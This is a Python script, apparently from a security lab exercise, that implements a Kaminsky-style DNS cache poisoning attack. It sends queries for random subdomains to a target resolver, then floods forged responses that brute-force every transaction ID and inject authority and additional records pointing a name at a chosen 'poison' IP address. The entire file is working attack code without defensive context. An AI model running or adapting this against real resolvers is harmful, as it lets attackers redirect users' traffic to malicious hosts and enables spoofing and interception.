#!/usr/bin/env python3
# coding: UTF-8

import sys
import socket
import struct

argvs = sys.argv
argc = len(argvs)

# TODO considering argvs
if argc != 2:
    print ('Usage: python %s  (Target DNS Address) #(Poison IP Address)' % argvs[0])
    sys.exit(1)

DNS = argvs[1]   # Target DNS
POISON_ADDRESS = "216.58.197.14" # argvs[2] # Request IP Address (Google Address)
RANDOM_ADDRESS = "192.168.2.101"
URL = "web.server.cysec.local" #argvs[3]  # Request URL
PORT = 53       # DNS Port
LEN = 512       # maxLen bits

# URL xxx.yyyy.zz
# convert -> 3xxx4yyyy2zz
def convert_dns_url(url):
    dns_url = ""
    url_a = url.split(".")
    for array in url_a:
        dns_url += str(len(array))
        for c in array:
            dns_url += c

    return dns_url

def convert_16_bits(num):
    return num.to_bytes(2, 'big')

def url_dnsformat_convert(url):
    url_con = convert_dns_url(url)
    url_len = len(url_con) 
    
    format = b''
    for c in url_con:
        if c.isdigit():
            c = int(c)
        else:
            c = ord(c)
        format += c.to_bytes(1, 'big')

    format += b'\x00'

    return format

def ip_dnsformat_convert(ip_address):
    format = b''
    address_a = ip_address.split(".")
    for address in address_a:
        format += int(address).to_bytes(1, 'big')

    return format

# Generate DNS Request
# for a server status request, we only need a header
# header format is described in RFC 1035
def header_request(qr, qdcount, ancount, nscount, arcount):

    #qr      = 1 << 15 # qr = 1      => query (response)
    opcode  = 0 << 11 # opcode = 0  => standard request
    aa      = 1 << 10
    tc      = 0 << 9
    rd      = 1 << 8
    ra      = 0 << 7
    z       = 0 << 6
    ad      = 0 << 5
    cd      = 0 << 4
    rcode   = 0 << 0

    #qdcount = 1
    #ancount = 1
    #nscount = 1
    #arcount = 2

    # convets 16bit bits array
    #f1 = convert_16_bits(id)
    f2 = convert_16_bits(qr + opcode + aa + tc + rd + ra + z + ad + cd + rcode) 
    f3 = convert_16_bits(qdcount)
    f4 = convert_16_bits(ancount)
    f5 = convert_16_bits(nscount)
    f6 = convert_16_bits(arcount)

    header = f2 + f3 + f4 + f5 + f6

    return header

def question_request(i):
    # Refere:http://www5e.biglobe.ne.jp/%257eaji/3min/66.html
    qname = url_dnsformat_convert('nx' + '{0:05d}'.format(i) + '.' + URL)
    qtype = 1   # A record
    qclass = 1  # default is 1 (InternetClass IN=1)

    # convets 16bit bits array
    f1 = qname
    f2 = convert_16_bits(qtype)
    f3 = convert_16_bits(qclass)
    
    question = f1 + f2 +f3

    return question

def answer_request(i):
    name    = url_dnsformat_convert('nx' + '{0:05d}'.format(i)  + '.' + URL)
    type    = 1     # A host address
    class_  = 1     # IN (Internet)
    ttl     = 3600  # 1 hour
    rdlen   = 4     # Data Length
    rdata   = ip_dnsformat_convert(RANDOM_ADDRESS)

    
    # convets 16bit bits array
    f1 = name
    f2 = convert_16_bits(type)
    f3 = convert_16_bits(class_)
    f4 = ttl.to_bytes(4, 'big')
    f5 = convert_16_bits(rdlen)
    f6 = rdata

    answer = f1 + f2 + f3 + f4 + f5 + f6

    return answer

def authority_request():
    name    = b'\xC0\x14'
    type    = 2     # NS (an authoritative Name Server)
    class_  = 1
    ttl     = 3600  # 1 hour
    rdlen   = 2     # Data Length
    rdata   = name

    f1 = name
    f2 = convert_16_bits(type)
    f3 = convert_16_bits(class_)
    f4 = ttl.to_bytes(4, 'big')
    f5 = convert_16_bits(rdlen)
    f6 = rdata

    authority = f1 + f2 + f3 + f4 + f5 + f6

    return authority

# TODO メッセージ圧縮
# nx000?.web.server.cysec.local決め打ち
def additional_request(i):
    name    = b'\xC0\x14' # メッセージ圧縮
    type    = 1
    class_  = 1
    ttl     = 3600  # 1 hour
    rdlen   = 4     # Data Length
    rdata   = ip_dnsformat_convert(POISON_ADDRESS)

    f1 = name
    f2 = convert_16_bits(type)
    f3 = convert_16_bits(class_)
    f4 = ttl.to_bytes(4, 'big')
    f5 = convert_16_bits(rdlen)
    f6 = rdata
    
    additional = f1 + f2 + f3 + f4 + f5 + f6

    return additional

def additional_dnssec_request():
    name    = 0     # <Root>
    type    = 29    # OPT (EDNS0 option)
    size    = 4096  # UDP payload size
    rcode   = 0     
    version = 0     # EDNS0 Version
    z       = b'\x80\x00'
    length  = 0     # Data Length

    # convert binary array
    f1 = name.to_bytes(1, 'big')
    f2 = convert_16_bits(type)
    f3 = convert_16_bits(size)
    f4 = rcode.to_bytes(1, 'big')
    f5 = version.to_bytes(1, 'big')
    f6 = z
    f7 = convert_16_bits(length)

    additional = f1 + f2 + f3 + f4 + f5 + f6 + f7

    return additional

def main():
    # create kaminsky header ignore id
    kaminsky_header = header_request(qr=1, qdcount=1, ancount=1, nscount=1, arcount=2)

    # create solve header
    resolve_header = header_request(qr=0, qdcount=1, ancount=0, nscount=0, arcount=0)
        
    # create authority
    authority = authority_request()
    
    # create socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.connect((DNS,PORT))
    
    for i in range(1, 65536):
        # create question
        question = question_request(i)

        # create answer
        answer = answer_request(i)

        # create additional
        additional = additional_request(i) + additional_dnssec_request()
        
        # create name resolve
        resolve_req = i.to_bytes(2, 'big') + resolve_header + question
        
        # send solve query
        sock.send(resolve_req)

        # create DNS request message
        kaminsky_req = kaminsky_header + question + answer + authority + additional

        for j in range(1, 65536):
            if i == 1 and j == 1:
                # display DNS request message
                print (" Request:  ", end='')
                print (j.to_bytes(2, 'big')+kaminsky_req)

            # send kaminsky query
            sock.send(j.to_bytes(2, 'big')+kaminsky_req)
    
if __name__ == '__main__':
    main()

